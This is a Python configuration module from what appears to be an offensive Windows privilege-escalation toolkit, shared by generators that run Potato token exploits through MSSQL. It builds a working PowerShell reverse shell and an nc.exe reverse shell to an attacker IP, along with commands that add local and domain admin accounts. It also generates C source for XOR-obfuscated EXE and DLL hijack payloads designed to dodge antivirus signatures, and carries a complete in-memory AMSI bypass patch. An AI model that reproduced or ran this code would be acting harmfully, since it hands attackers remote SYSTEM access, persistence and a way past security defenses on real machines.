"""Shared config + per-tool templates for the Potato-via-MSSQL generators.

ONE definition per concept: edit LHOST / LPORT / TOOL here and every generator
(gen_full / gen_nonet / gen_forma) picks it up. The templates mirror the repo's
llamaexpress.mcp.ad.winprivesc.POTATOES table.
"""
import base64
import random

# ================= EDIT THESE =================
LHOST, LPORT = "10.10.14.7", 443
TOOL = "GodPotato-NET4.exe"      # pick a key from POTATOES below (match target .NET / transport)
STAGE = "C:\\Windows\\Temp"      # writable staging dir. Restricted/monitored? set to %TEMP% or another
                                 #   writable dir. --stagedir overrides per invocation.
REVTYPE = "powershell"           # powershell | nc   (nc needs nc.exe staged on target; PS is the default
                                 #   and works everywhere PowerShell isn't in Constrained Language Mode)
# ==============================================

# Per-tool "run <CMD> as SYSTEM" argument templates. {CMD} is the SYSTEM command.
#   POTATOES         -> argv list, for reflective EntryPoint.Invoke(string[])   (gen_full / gen_nonet)
#   POTATOES_CMDLINE -> command-line string, for on-disk `exe <args>`           (gen_forma)
POTATOES = {
    "PrintSpoofer64.exe":  ["-c", "{CMD}"],                                          # needs Spooler (1058-prone)
    "GodPotato-NET4.exe":  ["-cmd", "{CMD}"],                                        # RPCSS  (1058-immune)
    "GodPotato-NET35.exe": ["-cmd", "{CMD}"],
    "GodPotato-NET2.exe":  ["-cmd", "{CMD}"],
    "EfsPotato.exe":       ["{CMD}"],                                                # LSASS/EFSRPC; append pipe int for fallback
    "SharpEfsPotato.exe":  ["-p", "C:\\Windows\\System32\\cmd.exe", "-a", "/c {CMD}"],
    "JuicyPotatoNG.exe":   ["-t", "*", "-p", "cmd.exe", "-a", "/c {CMD}"],           # needs a COM CLSID
    "SweetPotato.exe":     ["-a", "{CMD}"],                                          # AUTO-picks the best technique (the "family in one")
    "RoguePotato.exe":     ["-r", "{LHOST}", "-e", "{CMD}", "-l", "9999"],           # needs the attacker OXID redirector (see note)
    "GenericPotato.exe":   ["-e", "cmd.exe", "-a", "/c {CMD}", "-m", "namedpipe"],   # named-pipe / HTTP coercion variant
}
POTATOES_CMDLINE = {
    "PrintSpoofer64.exe":  '-c "{CMD}"',
    "GodPotato-NET4.exe":  '-cmd "{CMD}"',
    "GodPotato-NET35.exe": '-cmd "{CMD}"',
    "GodPotato-NET2.exe":  '-cmd "{CMD}"',
    "EfsPotato.exe":       '"{CMD}"',
    "SharpEfsPotato.exe":  '-p C:\\Windows\\System32\\cmd.exe -a "/c {CMD}"',
    "JuicyPotatoNG.exe":   '-t * -p "cmd.exe" -a "/c {CMD}"',
    "SweetPotato.exe":     '-a "{CMD}"',
    "RoguePotato.exe":     '-r {LHOST} -e "{CMD}" -l 9999',
    "GenericPotato.exe":   '-e cmd.exe -a "/c {CMD}" -m namedpipe',
}
# RoguePotato needs an OXID resolver redirector on the ATTACKER (RPC 135 is filtered outbound on modern builds):
#   socat tcp-listen:135,reuseaddr,fork tcp:<TARGET>:9999     # then RoguePotato -r <ATTACKER_IP> ... -l 9999
# DCOMPotato (zcgonvh, service-only accts) + LocalPotato (NTLM local reflection = arbitrary FILE WRITE as SYSTEM,
#   not a run-cmd) also exist — situational; supply the exe + see their repos. SweetPotato covers most cases here.


def utf16b64(s):                 # for  powershell -e  (EncodedCommand = UTF-16LE base64)
    return base64.b64encode(s.encode("utf-16-le")).decode()


def read_tool(path):
    """Read a supplied Potato exe for staging, or exit with an ACTIONABLE message.

    These exes are bring-your-own (see SUPPLIED-BINARIES.md) — the kit never ships them. Without this
    guard a missing/mistyped file dumps a raw Python traceback, which reads like a broken tool rather
    than 'you haven't staged the exe yet'."""
    import os
    import sys
    if not os.path.isfile(path):
        sys.exit(
            f"error: cannot read '{path}'.\n"
            f"  This generator stages a Potato exe that YOU supply — the kit does not ship it.\n"
            f"  Fix one of:\n"
            f"    1. put the exe here and pass it:   python3 {os.path.basename(sys.argv[0])} ./{TOOL}\n"
            f"    2. or point TOOL in _winpriv_common.py at the file you have (currently TOOL={TOOL!r})\n"
            f"  Sources for each build are listed in ../SUPPLIED-BINARIES.md."
        )
    with open(path, "rb") as fh:
        return fh.read()


def _revshell():
    return (
        f"$c=New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';"
        "$sb=([text.encoding]::ASCII).GetBytes($r2);"
        "$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
    )


def win_revshell(revtype=None):
    """The reverse-shell command a payload runs. powershell (default, encoded, works everywhere PS isn't
    in Constrained Language Mode); nc = nc.exe -e cmd.exe (needs nc.exe staged, but survives CLM/no-PS)."""
    rt = revtype or REVTYPE
    if rt == "nc":
        return f"nc.exe {LHOST} {LPORT} -e cmd.exe"     # stage nc.exe first (certutil); survives CLM/no-PowerShell
    return f"powershell -e {utf16b64(_revshell())}"

# The command each Potato runs AS SYSTEM: a reverse shell to LHOST:LPORT (type per REVTYPE).
SYSCMD = win_revshell()


def argv_for(tool):              # -> list[str], {CMD}/{LHOST} filled, for string[] EntryPoint.Invoke
    return [t.replace("{CMD}", SYSCMD).replace("{LHOST}", LHOST) for t in POTATOES[tool]]


def cmdline_for(tool):           # -> str, {CMD}/{LHOST} filled, for on-disk `exe <cmdline>`
    return POTATOES_CMDLINE[tool].replace("{CMD}", SYSCMD).replace("{LHOST}", LHOST)


def ps_argv_literal(tool):       # -> "'a','b',..."  a PowerShell string[] literal of the argv
    return ",".join("'" + a.replace("'", "''") + "'" for a in argv_for(tool))


# ===================================================================================================
# SERVICE / DLL-HIJACK privesc (broader than the Potato token family). Used by gen_payload / gen_service
# / gen_dll. A planted exe or DLL runs {CMD} in the LOADER's security context — SYSTEM for most services.
# ===================================================================================================
ADMIN_USER, ADMIN_PASS = "svcadm", "S3rv1ce!Adm1n"      # created by the add_admin action

def win_actions(revtype=None):
    """What the planted payload runs. add_admin makes a LOCAL admin (local SYSTEM can't make a DOMAIN
    admin unless it's a DC or the service runs as a privileged domain account).
    NOTE on AMSI: a native planted EXE/DLL is NOT AMSI-scanned (AMSI hooks script/managed content, not PEs).
    `revshell_amsi` folds the AmsiScanBuffer byte-patch into the spawned powershell so its post-ex `iex` loop
    is AMSI-clean; `add_admin` never touches powershell so it's inherently AMSI-free.
    revtype (powershell|nc) selects the `revshell` flavor for CLM/no-PowerShell targets."""
    return {
        "revshell":         win_revshell(revtype),   # TCP reverse shell to LHOST:LPORT (SYSTEM context)
        "revshell_amsi":    f"powershell -ep bypass -e {utf16b64(AMSI + _revshell())}",  # self-patches AMSI first
        "add_admin":        f"net user {ADMIN_USER} {ADMIN_PASS} /add & "
                            f"net localgroup administrators {ADMIN_USER} /add",
        "add_admin_domain": f'net user {ADMIN_USER} {ADMIN_PASS} /add /domain & '
                            f'net group "Domain Admins" {ADMIN_USER} /add /domain',
    }

def payload_c(kind, cmd):
    """C source for the hijack payload. kind='exe' (service/unquoted-path replacement) or 'dll' (search-order
    hijack). The command is XOR-obfuscated (decoded at runtime) so the plaintext `net user`/powershell string
    isn't sitting in the PE for a trivial AV static signature. This is AV-static evasion only — a native PE is
    already not AMSI-scanned, and this is NOT EDR-proof (the load/spawn behavior is still visible).
    The exe fires via WinExec and returns fast (a service exe must not block the SCM). The dll spawns a thread
    from DllMain (NEVER do heavy work under loader lock) so it returns immediately."""
    full = cmd if kind == "dll" else ("cmd /c " + cmd)
    key = random.randint(1, 255)     # RANDOM per build -> every payload is byte-unique, no fixed-key signature
    enc = bytes(b ^ key for b in full.encode()) + bytes([0x00 ^ key])   # xor'd, incl. a xor'd NUL terminator
    arr = ",".join(str(b) for b in enc)
    hdr = (f"static unsigned char e[]={{{arr}}};static char k={key};\n"
           "static void dec(char*b){int n=sizeof(e),i;for(i=0;i<n;i++)b[i]=e[i]^k;}\n")
    if kind == "dll":
        return ("#include <windows.h>\n#include <stdlib.h>\n" + hdr +
                "DWORD WINAPI go(LPVOID p){char b[sizeof(e)];dec(b);system(b);return 0;}\n"
                "BOOL WINAPI DllMain(HINSTANCE h,DWORD r,LPVOID x){"
                "if(r==DLL_PROCESS_ATTACH){CreateThread(NULL,0,go,NULL,0,NULL);}return TRUE;}\n")
    return ("#include <windows.h>\n" + hdr +
            "int main(void){char b[sizeof(e)];dec(b);WinExec(b,SW_HIDE);return 0;}\n")

def win_compile(kind, src, out, arch="x64"):
    """mingw cross-compile command (run on the attacker; air-gap-friendly, no target toolchain)."""
    cc = "x86_64-w64-mingw32-gcc" if arch == "x64" else "i686-w64-mingw32-gcc"
    return f"{cc} {'-shared ' if kind == 'dll' else ''}-o {out} {src}"

def unquoted_candidates(binpath):
    """Given an UNQUOTED service ImagePath with spaces, the exe names Windows tries in order.
    e.g. C:\\Program Files\\My App\\svc.exe -> [C:\\Program.exe, C:\\Program Files\\My.exe]."""
    path = binpath.strip().strip('"')
    if path.lower().endswith(".exe"):
        pass                     # keep as-is; args after .exe are ignored for the split below
    parts = path.split(" ")
    cands, acc = [], ""
    for i, p in enumerate(parts[:-1]):          # every space boundary before the real exe
        acc = p if i == 0 else acc + " " + p
        cands.append(acc + ".exe")
    return cands


# ===================================================================================================
# DANGEROUS-PRIVILEGE -> ROUTE map (whoami /priv). The deterministic "which tool handles this token".
# ===================================================================================================
WIN_PRIVS = {
    "SeImpersonatePrivilege":     "Potato -> SYSTEM. ROUTE 1 (gen_full/nonet/forma).",
    "SeAssignPrimaryTokenPrivilege":"Potato -> SYSTEM. ROUTE 1 (same as SeImpersonate).",
    "SeBackupPrivilege":          "read ANY file -> dump SAM/SYSTEM/SECURITY hives. ROUTE 4 (gen_hashdump).",
    "SeRestorePrivilege":         "write ANY file -> overwrite a service exe / drop a System32 DLL -> SYSTEM. ROUTE 4 note.",
    "SeDebugPrivilege":           "dump LSASS / inject into a SYSTEM process. gen_creds.py --mode lsass.",
    "SeLoadDriverPrivilege":      "load a vulnerable signed driver (BYOVD) -> kernel r/w -> SYSTEM. gen_winexploit seloaddriver.",
    "SeTakeOwnershipPrivilege":   "take ownership of a SYSTEM-owned file/service exe, rewrite ACL, replace it -> SYSTEM.",
    "SeManageVolumePrivilege":    "arbitrary-file-write primitive -> plant a DLL a SYSTEM service loads -> SYSTEM.",
    "SeTcbPrivilege":             "act as part of the OS -> craft a SYSTEM token. (advanced; rare.)",
    "SeCreateTokenPrivilege":     "craft an arbitrary token incl. SYSTEM. (advanced; rare.)",
}

# Windows local-privesc TECHNIQUES / CVEs (the GodPotato-bucket analog). Like the Linux EXPLOITS table:
# version-MATCH first; many need a PoC/driver YOU supply (air-gapped), same model as the Linux bucket.
WIN_EXPLOITS = {
    "printnightmare": {
        "cve": "CVE-2021-1675 / 34527", "applies": "Print Spooler running + you can reach the pipe (very common 2021-2022)",
        "needs": "Spooler service ON. A malicious DLL (reuse gen_payload.py dll).",
        "how": ("point the spooler at a DLL via AddPrinterDriverEx -> it loads YOUR dll as SYSTEM. "
                "Easiest: the PowerShell PoC Invoke-Nightmare (-DriverName any), or SharpPrintNightmare + a UNC/local dll."),
        "note": "reuses the DLL payload: python3 gen_payload.py dll --action add_admin ; then feed that dll to the PoC.",
    },
    "seriussam": {
        "cve": "CVE-2021-36934 (HiveNightmare/SeriousSAM)", "applies": "Win10/11 where SAM/SYSTEM/SECURITY are user-readable via a VSS shadow",
        "needs": "an existing VSS shadow copy (System Restore/most default installs).",
        "how": (r"check:  icacls C:\Windows\System32\config\SAM  -> if BUILTIN\Users has (R), you can read the hives "
                r"from a shadow:  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM ."),
        "note": "then dump OFFLINE like ROUTE 4: secretsdump.py -sam SAM -system SYSTEM LOCAL. It's a MISCONFIG, not a privilege.",
    },
    "seloaddriver": {
        "cve": "BYOVD (bring-your-own-vulnerable-driver)", "applies": "you hold SeLoadDriverPrivilege (often a service/backup acct)",
        "needs": "a known-vulnerable SIGNED driver YOU supply (e.g. RTCore64.sys, Capcom.sys, DBUtil).",
        "how": ("register the driver under an HKCU service key + NtLoadDriver (EnableLoadDriver/eoploaddriver.exe), "
                "then use the driver's arbitrary kernel r/w to steal a SYSTEM token."),
        "note": "chain is driver-specific; you supply the driver + its exploit. Loud (a driver load is logged).",
    },
    "localkernel": {
        "cve": "version-specific (e.g. CVE-2021-1732 win32k, CVE-2023-21768 afd.sys)", "applies": "unpatched build; MATCH the exact build",
        "needs": "a compiled PoC.exe YOU supply for the EXACT target build.",
        "how": ("systeminfo / `wmic qfe list` -> feed to Watson/wesng on the attacker -> it names the missing-KB LPE. "
                "Supply that PoC.exe, drop it (certutil), run it."),
        "note": "same 'you supply the PoC' model as the Linux bucket; a wrong-build kernel PoC can BSOD the box.",
    },
}


# Robust AMSI bypass: reflective AmsiScanBuffer byte-patch (no Add-Type, no csc, fully in-memory).
# Only needed on the in-memory managed-load paths (gen_full / gen_nonet); on-disk PEs aren't AMSI-scanned.
AMSI = (
 "function LookupFunc{Param($m,$f);"
 "$a=([AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')});"
 "$t=@();$a.GetType('Microsoft.Win32.UnsafeNativeMethods').GetMethods()|ForEach-Object{If($_.Name -eq 'GetProcAddress'){$t+=$_}};"
 "return $t[0].Invoke($null,@(($a.GetType('Microsoft.Win32.UnsafeNativeMethods').GetMethod('GetModuleHandle')).Invoke($null,@($m)),$f))};"
 "function getDelegateType{Param([Type[]]$func,[Type]$d=[Void]);"
 "$tp=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('R')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('M',$false).DefineType('D','Class,Public,Sealed,AnsiClass,AutoClass',[System.MulticastDelegate]);"
 "$tp.DefineConstructor('RTSpecialName,HideBySig,Public',[System.Reflection.CallingConventions]::Standard,$func).SetImplementationFlags('Runtime,Managed');"
 "$tp.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',$d,$func).SetImplementationFlags('Runtime,Managed');"
 "return $tp.CreateType()};"
 "[IntPtr]$fa=LookupFunc amsi.dll AmsiScanBuffer;$op=0;"
 "$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect),(getDelegateType @([IntPtr],[UInt32],[UInt32],[UInt32].MakeByRefType()) ([Bool])));"
 "$vp.Invoke($fa,3,0x40,[ref]$op)|Out-Null;"
 "$pt=[Byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);"
 "[System.Runtime.InteropServices.Marshal]::Copy($pt,0,$fa,6);"
)
